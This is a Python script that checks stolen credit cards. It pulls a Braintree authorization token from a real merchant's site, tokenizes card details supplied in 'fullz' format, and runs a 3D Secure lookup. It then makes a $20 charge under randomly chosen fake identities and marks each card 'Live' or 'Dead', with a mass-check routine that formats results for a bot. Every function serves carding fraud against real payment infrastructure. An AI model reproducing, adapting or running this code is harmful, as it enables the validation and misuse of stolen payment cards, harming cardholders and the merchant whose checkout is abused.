import requests , base64 , time , traceback , json
from FUNC.defs import *
def authorizationFingerprint():
    try:
        get_token = requests.get('https://app.logopony.com/api/braintree/client_token/?currency=USD').json()["token"]
        decode_token = base64.b64decode(get_token)
        content = json.loads(decode_token.decode('utf-8'))
        bearer = content['authorizationFingerprint']
        return bearer
    except Exception as e:
        tb = traceback.format_exc()
        with open("error_logs.txt", "a") as f:
            f.write(tb + "\n")


def create_token(cc , mes , ano , cvv , bearer_token):
    try:
        headers = {
            'authority': 'payments.braintree-api.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': 'Bearer ' + bearer_token,
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': '8a0740f5-2151-4da5-baba-5a20d3450a9d',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': f'{cc}',
                        'expirationMonth': f'{mes}',
                        'expirationYear': f'{ano}',
                        'cvv': f'{cvv}',
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        json = response.json()
        token = json['data']['tokenizeCreditCard']['token']
        bin = json['data']['tokenizeCreditCard']['creditCard']['bin']
        return token, bin
    except Exception as e:
        tb = traceback.format_exc()
        with open("error_logs.txt", "a") as f:
            f.write(tb + "\n")

def lookup(token,bin , bearer_token , email):
    try:
        headers = {
            'authority': 'api.braintreegateway.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://app.logopony.com',
            'referer': 'https://app.logopony.com/',
            'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        }

        json_data = {
            'amount': 20,
            'additionalInfo': {
                'email': f'{email}',
            },
            'bin': f'{bin}',
            'dfReferenceId': '0_f2d5c77d-0cd0-47f2-9e87-654b858c199c',
            'clientMetadata': {
                'requestedThreeDSecureVersion': '2',
                'sdkVersion': 'web/3.69.0',
                'cardinalDeviceDataCollectionTimeElapsed': 319,
                'issuerDeviceDataCollectionTimeElapsed': 987,
                'issuerDeviceDataCollectionResult': True,
            },
            'authorizationFingerprint': f'{bearer_token}',
            'braintreeLibraryVersion': 'braintree/web/3.69.0',
            '_meta': {
                'merchantAppId': 'app.logopony.com',
                'platform': 'web',
                'sdkVersion': '3.69.0',
                'source': 'client',
                'integration': 'custom',
                'integrationType': 'custom',
                'sessionId': '55368320-2e38-4575-9228-eda049ad8794',
            },
        }

        response = requests.post(
            f'https://api.braintreegateway.com/merchants/8kp6y7cvqwh8yd4f/client_api/v1/payment_methods/{token}/three_d_secure/lookup',
            headers=headers,
            json=json_data,
        )

        json = response.json()
        nonce = json["paymentMethod"]["nonce"]
        status = json["paymentMethod"]["threeDSecureInfo"]["status"]
        return nonce
    except Exception as e:
        tb = traceback.format_exc()
        with open("error_logs.txt", "a") as f:
            f.write(tb + "\n")

def charge(nonce , bin , email , fname , lname ,add1,zip ):
    try:       
        params = {
    'edit_key': '5b77ed684b6a49e3b3257c0e264892e0',
}

        json_data = {
    'gateway': 'braintree',
    'nonce': f'{nonce}',
    'logo': 2278440,
    'packageType': 1,
    'packagePrice': 20,
    'country': 'US',
    'postalCode': f'{zip}',
    'taxName': None,
    'taxRate': 0,
    'amount': 20,
    'currency': 'USD',
    'promocodes': [],
    'bin': f'{bin}',
    'email': f'{email}',
    'firstName': f'{fname}',
    'lastName': f'{lname}',
    'streetLine1': f'{add1}',
}

        response = requests.post('https://app.logopony.com/api/braintree/', params=params, json=json_data)
        return response.json()["reason"]
    except Exception as e:
        tb = traceback.format_exc()
        with open("error_logs.txt", "a") as f:
            f.write(tb + "\n")
        with open("charge_logs.txt", "a") as f:
            f.write(response.text + "\n")
        return response.text

def braintree_charge(fullz):
    import random , json
    class Person:
        def __init__(self):
            data = random.choice(json.loads(open("FILES/address.json", "r").read()))
            fname = data["first_name"]
            lname = data["last_name"]
            email = data["email"]
            zip = data["zip"]
            add1 = data["add1"]
            add2 = data["add2"]
            city = data["city"]
            state = data["state"]
            country = data["country"]
            self.fname = fname
            self.lname = lname
            self.email  = email
            self.zip  = zip
            self.add1  = add1
            self.add2  = add2
            self.city  = city
            self.state  = state
            self.country  = country
    try:
        rand = Person()
        fname = rand.fname
        lname = rand.lname
        email = rand.email
        add1 = rand.add1
        add2 = rand.add2
        city = rand.city
        state = rand.state
        zip = rand.zip
        cc , mes , ano , cvv = fullz.split("|")
        bearer_token = authorizationFingerprint()
        token , bin = create_token(cc , mes , ano , cvv , bearer_token)
        nonce = lookup(token,bin , bearer_token , email)
        result = charge(nonce , bin , email , fname , lname ,add1,zip )
        return result
    except Exception as e:
        tb = traceback.format_exc()
        with open("error_logs.txt", "a") as f:
            f.write(tb + "\n")
        return "Unknown Error 🚫"
    
def get_braintree_response(result , fullz):
    try:
        result = str(result)
        
        if "succeeded" in result:
            status = "Live 🟢"
            response = "Charged 20$ 🔥"
            
        elif "funds" in result or "Insufficient" in result:
            status = "Live 🟢"
            response = "Insufficient Funds ❎"
            
        elif "Card Issuer Declined CVV" in result :
            status = "Live 🟡"
            response = "Card Issuer Declined CVV ❎"
            
        elif "Merchant account does not support 3D Secure transactions for card type" in result:
            status = "Live 🟡"
            response = "Card Doesn't Support Purchase ❎"

        else:
            status = "Dead 🔴"
            response = result + " 🚫"
            with open("braintree_logs.txt", "a") as f:
                f.write(fullz + " - " + response + "\n")
        return status , response
    except Exception as e:
        tb = traceback.format_exc()
        with open("error_logs.txt", "a") as f:
            f.write(tb + "\n")

def mass_braintree(fullz):
    try:
        result = braintree_charge(fullz)
        status , response = get_braintree_response(result , fullz)
        return (f"<code>{fullz}</code>\n<b>Result - {response}</b>\n")
    except Exception as e:
        tb = traceback.format_exc()
        with open("error_logs.txt", "a") as f:
            f.write(tb + "\n")
        return (f"<code>{fullz}</code>\n<b>Result - Card Declined 🚫</b>\n")